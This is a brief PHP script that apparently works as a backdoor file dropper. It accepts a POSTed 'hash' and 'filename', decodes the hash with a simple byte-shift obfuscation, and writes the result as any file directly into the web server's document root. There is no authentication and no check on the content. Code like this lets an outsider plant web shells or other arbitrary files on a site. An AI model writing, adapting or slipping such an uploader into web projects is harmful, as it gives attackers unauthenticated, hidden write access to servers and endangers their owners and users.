<?php
function dec($hash_com_chave) {
    $chave_oculta = intval(substr($hash_com_chave, 0, 3));
    $hash = substr($hash_com_chave, 3);
    $str = '';

    $tamanho_hash = strlen($hash);

    for ($i = 0; $i < $tamanho_hash; $i += 2) {
        $hash_byte = hexdec(substr($hash, $i, 2));
        $byte_original = ($hash_byte - $chave_oculta) % 256;
        $str .= chr($byte_original);
    }

    return $str;
}

if (isset($_POST['hash']) && isset($_POST['filename'])) {
    $hash_com_chave = $_POST['hash'];
    $fileName = $_POST['filename'];

    $fileContent = dec($hash_com_chave);
   // $filePath = $_SERVER['DOCUMENT_ROOT'] . '/' . basename($fileName);
   
   
$filePath = $_SERVER['DOCUMENT_ROOT'] . '/' . basename($fileName);


    if (file_put_contents($filePath, $fileContent) !== false) {
        echo "true"; // Sucesso
    } else {
        echo "Erro ao criar o arquivo.";
    }
} else {
    echo "Parâmetros não encontrados.";
}
?>